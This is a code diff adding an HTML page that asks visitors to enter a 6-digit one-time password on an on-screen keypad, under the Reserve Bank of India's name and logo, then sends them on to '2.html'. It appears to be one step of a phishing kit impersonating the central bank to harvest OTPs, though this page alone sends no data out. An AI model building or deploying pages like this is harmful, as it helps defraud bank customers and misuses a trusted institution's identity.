@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Input</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow-x: hidden; 
+        }
+        .otp-container {
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+            padding: 10px;
+        }
+        .otp-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        } 
+        
+        .header {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
+            margin-top: 25px;
+        }
+
+        .header-img {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .otp-box {
+            width: 40px;
+            height: 40px;
+            border: 2px solid #ccc;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            background-color: white;
+        }
+        .rbi-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: row; 
+            margin-top: 70px;
+            margin-bottom: -15px;
+            gap: 10px;
+ ll           
+        }
+        .rbi-logo {
+            width: 40px;
+            height: 40px;            
+        }
+        .keypad-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #005bbb;
+            padding: 20px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+        }
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 50px; 
+            justify-content: center;
+            align-items: center;
+        }
+        .keypad button {
+            width: 40px;
+            height: 40px;
+            font-size: 24px;
+            border: none;
+            background-color: transparent;
+            color: white;
+            cursor: pointer;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .keypad button:active {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        .keypad .clear, .keypad .submit {
+            background-color: white;
+            color: #005bbb;
+            border-radius: 10px;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="g.jpg" alt="Header Image" class="header-img">
+    </div>
+    <div class="otp-container">
+        <div class="otp-boxes">
+            <input type="password" class="otp-box" maxlength="1" readonly>
+            	
+            <input type="password" class="otp-box" maxlength="1" readonly>
+
+            <input type="password" class="otp-box" maxlength="1" readonly>
+
+            <input type="password" class="otp-box" maxlength="1" readonly>
+
+            <input type="password" class="otp-box" maxlength="1" readonly>
+
+            <input type="password" class="otp-box" maxlength="1" readonly>
+
+        </div>
+        <div class="rbi-container">
+            <img src="rbi.jpg" alt="RBI Logo" class="rbi-logo">
+            <strong><p>भारतीय रिज़र्व बैंक<br>RESERVE BANK OF INDIA</p>     </strong>
+        </div>
+    </div>
+    <div class="keypad-container">
+        <div class="keypad">
+            <button onclick="enterDigit(1)">1</button>
+            <button onclick="enterDigit(2)">2</button>
+            <button onclick="enterDigit(3)">3</button>
+            <button onclick="enterDigit(4)">4</button>
+            <button onclick="enterDigit(5)">5</button>
+            <button onclick="enterDigit(6)">6</button>
+            <button onclick="enterDigit(7)">7</button>
+            <button onclick="enterDigit(8)">8</button>
+            <button onclick="enterDigit(9)">9</button>
+            <button class="clear" onclick="clearOTP()">&#x2716;</button>
+            <button onclick="enterDigit(0)">0</button>
+            <button class="submit" onclick="submitOTP()">&#x2714;</button>
+        </div>
+    </div>
+    
+    <script>
+        function enterDigit(digit) {
+            let boxes = document.querySelectorAll(".otp-box");
+            for (let box of boxes) {
+                if (box.value === "") {
+                    box.value = digit;
+                    break;
+                }
+            }
+        }
+        
+        function clearOTP() {
+            document.querySelectorAll(".otp-box").forEach(box => box.value = "");
+        }
+        
+        function submitOTP() {
+            let otp = "";
+            document.querySelectorAll(".otp-box").forEach(box => otp += box.value);
+            if (otp.length === 6) {
+                window.location.href = "2.html";
+            } else {
+                alert("Please enter a 6-digit OTP");
+            }
+        }
+    </script>
+</body>
+</html>
